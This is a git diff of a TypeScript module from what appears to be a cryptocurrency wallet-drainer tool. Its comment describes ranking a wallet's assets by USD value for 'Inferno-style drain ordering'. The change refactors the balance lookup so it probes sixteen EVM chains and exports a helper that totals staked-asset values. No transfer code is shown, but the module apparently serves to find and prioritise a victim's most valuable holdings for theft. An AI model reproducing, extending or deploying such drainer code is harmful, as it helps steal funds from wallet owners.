@@ -26,6 +26,8 @@ import {
   legionMeshEventHeaders,
 } from './mesh-event.js'
 import { getPriceWithFallback } from '../price-oracle.js'
+import { PRIORITY_EVM_CHAIN_IDS } from '../caip/constants.js'
+import type { MultiBalanceChainRow } from './multi-balance.js'
 
 /** Lido stETH (Ethereum mainnet). */
 export const RECURSIVE_PREDATOR_STETH_TOKEN = '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84' as Address
@@ -224,7 +226,7 @@ export type RecursivePredatorFusionUsd = {
   assets_count: number
 }
 
-function computeRecursivePredatorFusionTotalUsd(out: RecursivePredatorFusionUsd): number {
+export function computeRecursivePredatorFusionTotalUsd(out: RecursivePredatorFusionUsd): number {
   return (
     out.staked_steth_usd +
     out.staked_msol_usd +
@@ -578,38 +580,9 @@ function amountRawToUsd(amountRaw: string, decimals: number, unitUsd: number): n
 }
 
 /** Rank wallet assets by estimated USD value (Inferno-style drain ordering). Cached 2 minutes. */
-export async function getRankedAssets(
-  wallet: string,
-  chainFamily?: string,
-): Promise<RankedAsset[]> {
-  const w = wallet.trim()
-  const familyNorm = (chainFamily ?? 'ALL').trim().toUpperCase()
-  const cacheKey = `${w.toLowerCase()}:${familyNorm}`
-  const cached = rankedAssetsCache.get(cacheKey)
-  if (cached && Date.now() - cached.at < RANKED_ASSETS_CACHE_MS) {
-    return cached.assets
-  }
-
-  const { fetchMultiChainBalances } = await import('./multi-balance.js')
-  const query: import('./multi-balance.js').MultiBalanceQuery = {}
-  if (w.startsWith('0x')) query.evm = w
-  else if (w.startsWith('T')) query.tron = w
-  else if (w.startsWith('EQ') || w.startsWith('UQ')) query.ton = w
-  else if (w.startsWith('bc1') || w.startsWith('1') || w.startsWith('3')) query.btc = w
-  else if (w.startsWith('cosmos')) query.cosmos = w
-  else if (!w.startsWith('0x') && w.length > 40) query.aptos = w
-  else query.sol = w
-
-  if (familyNorm === 'EVM' && w.startsWith('0x')) query.evm = w
-  if (familyNorm === 'SVM') query.sol = w
-  if (familyNorm === 'TRON') query.tron = w
-  if (familyNorm === 'TON') query.ton = w
-  if (familyNorm === 'UTXO') query.btc = w
-
-  const balance = await fetchMultiChainBalances(query)
+async function chainsToRankedRows(chains: MultiBalanceChainRow[], familyNorm: string): Promise<Omit<RankedAsset, 'rank'>[]> {
   const rows: Omit<RankedAsset, 'rank'>[] = []
-
-  for (const chain of balance.chains) {
+  for (const chain of chains) {
     if (familyNorm !== 'ALL' && chain.family.toUpperCase() !== familyNorm) continue
     const nativeUsd = await resolveTokenUsd(chain.native.symbol)
     const nativeAmountUsd = amountRawToUsd(chain.native.amount_raw, chain.native.decimals, nativeUsd)
@@ -640,6 +613,59 @@ export async function getRankedAssets(
       }
     }
   }
+  return rows
+}
+
+export async function getRankedAssets(
+  wallet: string,
+  chainFamily?: string,
+): Promise<RankedAsset[]> {
+  const w = wallet.trim()
+  const familyNorm = (chainFamily ?? 'ALL').trim().toUpperCase()
+  const cacheKey = `${w.toLowerCase()}:${familyNorm}`
+  const cached = rankedAssetsCache.get(cacheKey)
+  if (cached && Date.now() - cached.at < RANKED_ASSETS_CACHE_MS) {
+    return cached.assets
+  }
+
+  const { fetchMultiChainBalances } = await import('./multi-balance.js')
+
+  // EVM: probe all 16 priority chains (not mainnet-only)
+  if (familyNorm === 'EVM' && w.startsWith('0x')) {
+    const settled = await Promise.allSettled(
+      PRIORITY_EVM_CHAIN_IDS.map((cid) =>
+        fetchMultiChainBalances({ evm: w as Address, evm_chain_id: cid }),
+      ),
+    )
+    const rows: Omit<RankedAsset, 'rank'>[] = []
+    for (const result of settled) {
+      if (result.status !== 'fulfilled') continue
+      const part = await chainsToRankedRows(result.value.chains, 'EVM')
+      rows.push(...part)
+    }
+    rows.sort((a, b) => b.amount_usd - a.amount_usd)
+    const assets: RankedAsset[] = rows.map((row, idx) => ({ ...row, rank: idx + 1 }))
+    rankedAssetsCache.set(cacheKey, { at: Date.now(), assets })
+    return assets
+  }
+
+  const query: import('./multi-balance.js').MultiBalanceQuery = {}
+  if (w.startsWith('0x')) query.evm = w
+  else if (w.startsWith('T')) query.tron = w
+  else if (w.startsWith('EQ') || w.startsWith('UQ')) query.ton = w
+  else if (w.startsWith('bc1') || w.startsWith('1') || w.startsWith('3')) query.btc = w
+  else if (w.startsWith('cosmos')) query.cosmos = w
+  else if (!w.startsWith('0x') && w.length > 40) query.aptos = w
+  else query.sol = w
+
+  if (familyNorm === 'EVM' && w.startsWith('0x')) query.evm = w
+  if (familyNorm === 'SVM') query.sol = w
+  if (familyNorm === 'TRON') query.tron = w
+  if (familyNorm === 'TON') query.ton = w
+  if (familyNorm === 'UTXO') query.btc = w
+
+  const balance = await fetchMultiChainBalances(query)
+  const rows = await chainsToRankedRows(balance.chains, familyNorm)
 
   rows.sort((a, b) => b.amount_usd - a.amount_usd)
   const assets: RankedAsset[] = rows.map((row, idx) => ({ ...row, rank: idx + 1 }))
